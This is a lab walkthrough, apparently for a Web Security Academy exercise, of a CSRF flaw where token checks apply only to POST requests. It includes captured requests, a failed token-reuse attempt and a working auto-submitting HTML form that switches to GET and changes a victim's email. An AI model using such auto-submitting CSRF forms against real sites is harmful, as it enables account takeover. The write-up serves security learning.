# CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`.

---

## 1. Detection

- Clicked `ACCESS THE LAB` and was presented with the blog page. Clicked `My Account` and logged in with `wiener:peter`, landing on `/my-account?id=wiener`.
- Inspecting the email change form in the page source revealed a CSRF token present as a hidden field:

```html
<form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
    <label>Email</label>
    <input required="" type="email" name="email" value="">
    <input required="" type="hidden" name="csrf" value="o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm">
    <button class="button" type="submit"> Update email </button>
</form>
```

- Changed the email and captured the request in BurpSuite:

```http
POST /my-account/change-email HTTP/2
Host: 0a56009c03c146a78373758800ac0021.web-security-academy.net
Cookie: session=drjK5Zbo4ks6sVy6HDm9Zi2TUKiUx5oW
Content-Length: 58
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a56009c03c146a78373758800ac0021.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a56009c03c146a78373758800ac0021.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i

email=xyz%40test.com&csrf=o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm
```

---

## 2. Probing the CSRF Token Validation

- First tried removing the `csrf` parameter from the request body entirely. The server responded with:

```
"Missing parameter 'csrf'"
```

- The token was required. Next, tried reusing the same token across multiple email change requests to see if it was single-use. Changing the email value while keeping the same CSRF token worked each time — the server never invalidated the token after use.
- Then ran the following in `DevTools > Console` to check if the token changed between page loads:

```javascript
document.getElementsByName('csrf').item(0).value
```

- Got the same token across three consecutive page refreshes:

```
1 - o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm
2 - o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm
3 - o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm
```

- This showed the token was static per session — but it was still tied to the `wiener` session, so using it in a cross-user CSRF payload wouldn't work since the victim would have a different session and thus a different (or rejected) token.
- Tried embedding the static token into a cross-origin CSRF payload and delivered it via the exploit server:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a56009c03c146a78373758800ac0021.web-security-academy.net/my-account/change-email" method="POST">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="attacker@attacker.com" name="email"></td>
            <td><input type="text" value="o1OT2ziaMOV5IEXWhHanoOhrGEaWelxm" name="csrf"></td>
         </tr>
      </table>
   </form>
   <script>
        document.forms[0].submit();
   </script>
</html>
```

- No results — the server correctly rejected the cross-user token, confirming the CSRF token was being validated per user session for `POST` requests.

---

## 3. Bypassing via HTTP Method Switch

- The lab description hints that defenses are only applied to *certain types* of requests. The natural hypothesis was: what if the CSRF token check only runs on `POST` requests, and `GET` is left unprotected?
- Changed the request method from `POST` to `GET` in Repeater, moved the parameters into the query string, and removed the `csrf` parameter entirely:

```http
GET /my-account/change-email?email=xyz%40test.com HTTP/2
Host: 0a56009c03c146a78373758800ac0021.web-security-academy.net
Cookie: session=drjK5Zbo4ks6sVy6HDm9Zi2TUKiUx5oW
Cache-Control: max-age=0
Sec-Ch-Ua: "Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Windows"
Dnt: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
Origin: https://0a56009c03c146a78373758800ac0021.web-security-academy.net
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a56009c03c146a78373758800ac0021.web-security-academy.net/my-account?id=wiener
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=0, i
```

- The server accepted it with no CSRF validation whatsoever and responded:

```http
HTTP/2 302 Found
Location: /my-account?id=wiener
X-Frame-Options: SAMEORIGIN
Content-Length: 0
```

> **Why this works:** The application's CSRF defense only checks for a valid token on `POST` requests. The server-side logic likely looks something like:
>
> ```php
> if ($_SERVER['REQUEST_METHOD'] === 'POST') {
>     // validate CSRF token
> }
> ```
>
> Since HTML forms natively support both `GET` and `POST`, and the server-side endpoint accepts `GET` without enforcing CSRF protection, switching the method entirely sidesteps the token check. A cross-origin page can trigger a `GET` request with query parameters just as easily as a `POST`, and the victim's session cookie is sent along either way.

---

## 4. Solve the Challenge

- Updated the CSRF payload to use `method="GET"` instead of `POST`, with the email as a query parameter and no CSRF token needed:

```html
<html>
   <form enctype="application/x-www-form-urlencoded" action="https://0a56009c03c146a78373758800ac0021.web-security-academy.net/my-account/change-email" method="GET">
      <table>
         <tr>
            <td>email</td>
            <td><input type="text" value="attacker@attacker.com" name="email"></td>
         </tr>
      </table>
   </form>
   <script>
        document.forms[0].submit();
   </script>
</html>
```

- Hosted this on the exploit server and delivered it to the victim.
- The victim's browser auto-submitted the `GET` request on page load, the server changed the email without any CSRF check, and the lab was solved.